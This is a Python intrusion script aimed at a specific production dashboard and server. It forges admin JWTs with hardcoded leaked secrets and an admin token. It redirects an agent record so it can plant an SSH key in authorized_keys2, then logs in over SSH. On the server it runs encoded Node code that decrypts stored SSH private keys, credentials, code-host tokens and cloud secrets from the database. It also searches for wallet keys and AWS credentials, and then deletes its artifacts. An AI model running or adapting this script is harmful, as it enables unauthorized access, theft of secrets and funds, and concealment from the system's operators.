#!/usr/bin/env python3
# i29220 round C: re-upload key -> ssh ubuntu@122.51.1.87 -> decrypt PG credential/ssh-key/cloud store + bounded greps -> cleanup
import os, sys, json, time, base64, hmac, hashlib, subprocess
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
OLD_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29220c"

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=120):
    args = ["ssh", "-i", KEY, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes", "-o", "ConnectTimeout=15",
            "-o", "LogLevel=ERROR", "ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 25)

# P0 health
R("P0_health", call("/api/health", timeout=20))

# P1 original DTO
r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
orig = {}
for a in agents:
    if a.get("id") == AID:
        orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser"), "customer": a.get("customer")}
R("P1_admin", {"code": r["code"], "n": len(agents), "target": orig})

# P2 patch to local + ubuntu
pr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=2000)
R("P2_patch", {"code": pr["code"]})

# P3 keygen + upload
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()
open("/tmp/authorized_keys2", "w").write(pub + "\n")
sess = forge(OWNER)
def upload(path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA, "-H", "Cookie: session=" + sess,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:400]}
R("P4_upload", upload("/home/ubuntu/.ssh", "/tmp/authorized_keys2", "authorized_keys2"))

# P5 restore agent
rr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25, maxlen=2000)
R("P5_restore", {"code": rr["code"]})

# P6 ssh
rc, out, err = ssh("id; hostname", timeout=40)
R("P6_ssh", {"rc": rc, "out": out.decode("utf-8", "replace")[:400], "err": err.decode("utf-8", "replace")[-400:]})
if b"uid=" not in out:
    R("P6_result", "NO_SHELL"); print("NO SHELL", flush=True); sys.exit(0)

# P7 decrypt PG credential/ssh-key/cloud store
node_js = r"""
const fs=require('fs'),crypto=require('crypto');
let url=(fs.readFileSync('/opt/lumii-prod/.env.dev','utf8').match(/^DATABASE_URL=(.+)$/m)||[])[1];
if(url)url=url.trim();
const MASTERS=[process.env.__JWT||'', 'ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938', '297b8a491bc1920b918d01de77166556d3f835f473968c6b'].filter(Boolean);
function derive(m,l){return crypto.createHmac('sha256',m).update(l).digest();}
function openSeal(master,label,sealed){
  if(!sealed||sealed.length<29)throw new Error('short');
  const key=derive(master,label);
  const iv=sealed.subarray(0,12),tag=sealed.subarray(12,28),ct=sealed.subarray(28);
  const d=crypto.createDecipheriv('aes-256-gcm',key,iv);d.setAuthTag(tag);
  return Buffer.concat([d.update(ct),d.final()]);
}
function decryptCred(row){
  for(const m of MASTERS){
    try{
      const dekB64=openSeal(m,'lumii:ops-kek:v1',row.wrapped_dek).toString('utf8');
      const dek=Buffer.from(dekB64,'base64');
      const aad=Buffer.from(JSON.stringify(['lumii:ops-credential:v1',row.org_id,row.id]),'utf8');
      const c=row.ciphertext;
      const iv=c.subarray(0,12),tag=c.subarray(12,28),ct=c.subarray(28);
      const d=crypto.createDecipheriv('aes-256-gcm',dek,iv);d.setAAD(aad);d.setAuthTag(tag);
      return Buffer.concat([d.update(ct),d.final()]).toString('utf8');
    }catch(e){}
  }
  return null;
}
function decryptToken(sealed){
  for(const m of MASTERS){try{return openSeal(m,'lumii:code-host-token:v1',sealed).toString('utf8');}catch(e){}}
  return null;
}
function norm(v){ if(Buffer.isBuffer(v))return {b64:v.toString('base64'),len:v.length}; if(v instanceof Date)return v.toISOString(); return v; }
function normRow(o){const r={};for(const k in o)r[k]=norm(o[k]);return r;}
const {Client}=require('/opt/lumii-prod/node_modules/pg');
(async()=>{const c=new Client({connectionString:url});await c.connect();
 const q=async(s)=>{try{const r=await c.query(s);return r.rows;}catch(e){return [{err:String(e.message).slice(0,150)}];}};
 const out={};
 // schema of interesting tables
 out.cols=await q("select table_name,column_name,data_type from information_schema.columns where table_schema='public' and table_name in ('project_ssh_keys','project_ssh_key_hosts','credentials','credential_grants','code_host_connections','cloud_identities','cloud_link_credentials','secret_shares','org_models','im_credentials','project_environments','project_env_machines','users','projects') order by table_name,ordinal_position");
 // SSH keys + hosts
 const keys=await q("select id,org_id,project_id,name,source,scope,owner_id,key_type,public_key,fingerprint,status,ciphertext,wrapped_dek,kek_ref,next_ciphertext,next_wrapped_dek FROM project_ssh_keys limit 60");
 out.ssh_keys=keys.map(k=>{ if(k.err)return k; const o=normRow(k); o.private_key=decryptCred(k); if(k.next_ciphertext)o.next_private_key=decryptCred({org_id:k.org_id,id:k.id,ciphertext:k.next_ciphertext,wrapped_dek:k.next_wrapped_dek}); return o;});
 out.ssh_key_hosts=await q("select key_id,alias,host,port,login_user,connect,via_host_id,mode from project_ssh_key_hosts limit 120");
 // credentials (ssh_ca / web_account)
 const creds=await q("select id,org_id,project_id,environment_id,kind,name,meta,target_hosts,status,ciphertext,wrapped_dek,kek_ref,fingerprint,expires_at from credentials limit 120");
 out.credentials=creds.map(k=>{ if(k.err)return k; const o=normRow(k); o.plaintext=decryptCred(k); return o;});
 out.credential_grants=await q("select credential_id,principal_kind,principal_id,actions,expires_at from credential_grants limit 200");
 // code host tokens (github/gitea)
 const ch=await q("select id,org_id,host,name,auth_kind,account_login,base_url,token_sealed,token_scopes,state from code_host_connections limit 40");
 out.code_hosts=ch.map(k=>{ if(k.err)return k; const o=normRow(k); o.token=decryptToken(k.token_sealed); return o;});
 // cloud
 for(const t of ['cloud_identities','cloud_link_credentials','secret_shares','org_models','im_credentials','project_environments','project_env_machines','projects','users']){
   let rows=await q("select * from "+t+" limit 40");
   out[t]=rows.map(k=>{ if(k.err)return k; const o=normRow(k); for(const f of ['ciphertext','wrapped_dek','next_ciphertext','next_wrapped_dek','token_sealed','secret_sealed','private_key_sealed','api_key_sealed','encrypted','dek']){ if(k[f]){ const p=(f==='token_sealed'||/sealed/.test(f))?decryptToken(k[f]):decryptCred({org_id:k.org_id||k.orgId,ciphertext:k[f],wrapped_dek:k.wrapped_dek||k.wrappedDek,id:k.id}); o[f+'_plain']=p; } } return o;});
 }
 await c.end();
 console.log(JSON.stringify(out).slice(0,42000));
})().catch(e=>console.log('ERR',String(e).slice(0,500)));
"""
b64 = base64.b64encode(node_js.encode()).decode()
cmd = "cd /opt/lumii-prod && echo %s | base64 -d > /tmp/pg29220c.cjs && timeout 90 node /tmp/pg29220c.cjs" % b64
rc, out, err = ssh(cmd, timeout=120)
R("P7_pg_decrypt", {"rc": rc, "out": out.decode("utf-8", "replace")[:42000], "err": err.decode("utf-8", "replace")[:400]})

# P8 bounded filesystem greps for target keys / zoofi / cloud creds
cmd = (
 "echo '=== TARGET_HEX ==='; timeout 40 grep -rIoE '0x[0-9a-fA-F]{64}' /home/ubuntu/.ssh /opt/lumii-prod/.env* /opt/lumii-prod/scripts /opt/lumii-prod/deploy /home/ubuntu/*.txt /home/ubuntu/*.md 2>/dev/null | sort -u | head -80\n"
 "echo '=== ZOOFI_FILES ==='; timeout 60 grep -rIl -i 'zoofi' /opt/lumii-prod /home/ubuntu --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist 2>/dev/null | head -25\n"
 "echo '=== PRIVATEKEY_FILES ==='; timeout 60 grep -rIl -e 'BEGIN OPENSSH PRIVATE KEY' -e 'BEGIN RSA PRIVATE KEY' -e 'BEGIN EC PRIVATE KEY' /home/ubuntu /opt/lumii-prod --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist 2>/dev/null | head -40\n"
 "echo '=== CLOUD_CREDS ==='; cat /home/ubuntu/.aws/credentials 2>/dev/null; sudo cat /root/.aws/credentials 2>/dev/null; sudo ls -la /root/.ssh 2>/dev/null | head -20\n"
 "echo '=== KEYSTORE ==='; timeout 30 find /home/ubuntu /opt -maxdepth 5 \\( -iname '*.keystore' -o -iname 'UTC--*' -o -iname 'keystore*' \\) 2>/dev/null | head -30\n"
)
rc, out, err = ssh(cmd, timeout=300)
R("P8_grep", {"rc": rc, "out": out.decode("utf-8", "replace")[:18000]})

# P9 cleanup our artifacts
cmd = ("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; "
       "ls -la /home/ubuntu/.ssh/authorized_keys2 2>&1 | head -1; echo CLEANED")
rc, out, err = ssh(cmd, timeout=30)
R("P9_cleanup", {"rc": rc, "out": out.decode("utf-8", "replace")[:400]})

R("P99_done", "roundC complete")
print("DONE", flush=True)
